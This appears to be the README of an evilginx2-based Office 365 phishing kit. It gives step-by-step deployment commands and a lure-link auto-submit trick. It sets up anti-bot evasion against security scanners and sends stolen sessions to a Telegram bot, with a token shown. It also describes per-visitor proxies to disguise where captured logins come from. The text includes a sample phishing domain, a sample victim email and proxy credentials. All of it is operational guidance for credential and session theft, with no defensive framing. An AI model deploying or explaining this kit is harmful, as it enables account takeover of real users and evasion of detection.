# Advanced o365 phishing kit with antibot

# Fast setup
1. Upload installer.run to new VPS's root directory
2. Run `bash installer.run`
3. Enter sub & domain when questioned
4. Enter lure link when questioned

## Installation
1. Upload evilginx.zip to root directory
2. Open ssh terminal inside server
3. apt install unzip
3. unzip evilginx2.zip
4. cd evilginx2
5. bash dockerz.sh
6. make
7. config domain {domain}
8. config ip 127.0.0.1
9. phishlets hostname {phishlet} {domain}
10. If using proxy:
101. proxy address {proxy ip}
102. proxy port {proxy address}
103. proxy type {http, https, socks5, socks5h}
104. proxy enable
11. blacklist unauth
12. config webhook_telegram bot_token/chat_id (example: 5482299642:AAGxKj9ZpYuXReJJvyLOQ1n8ReB8hsufeIf/-1991926104289
13. config webhook_verbosity 1
14. aversions simplebot (free)
15. aversions nkpbot (premium, free)
16. aversions killbot_key (api key here)
17. aversions killbot 
18. Restart evilginx
19. phishlets enable o365
20. lures create o365
21. lures get-url 0 or lures get-url {id}

## Edit values
To edit the phishing site's domain, subdomain, lure you need to rerun start.sh from the evilginx2 root directory.

Run: ```./install/start.sh```

## Auto-enter email (O365)

To have email prefilled and entered you need to add poundsign (#) to the end of phishing link along with the email address you want to prefill.
Regular phishing link: https://login-ms.arnmica.com/o365
Link with auto-email: https://login-ms.arnmica.com/o365#daren.chester@office.com

If using email autofill feature like in the example, then the visitor will have `daren.chester@office.com` auto entered into the email input field and submitted automatically on visit without any interaction.

## Close ssh and keep evilginx2 running

To keep evilginx2 running after you close the ssh connection, use screen before running evilginx.
So before running `make`, run `screen` and then do what you want inside evilginx.

To exit the `screen` cmd, enter CTRL+A+D on the keyboard. This will detach the evilginx process while keeping it running in the background. Run `screen -list` to list all the detached processes. Make sure there's only one evilginx instance at a time since ports can't be occupied by different processes.
You can now close the ssh window if you want to. Afterwards, when you want to use evilginx again, run `screen -x`. This will reattach you to the evilginx process.

## Session proxy

Evilginx2 supports setting an unique proxy per visitor session. This makes it so all the logins don't seem to be coming from the same IP address.
To use, enable it via config `proxy session` and enter the proxies you want to use into the proxies.txt file in config directory.
Proxies have to be provided in correct URL format: `proxytype://username:password@server:port` e.g. socks5://Awo66AAkOlPC:gpbq1lHZQl71WQv@161.77.232.228:58369

## Blacklist is disabled when evilginx is launched with debug mode enabled
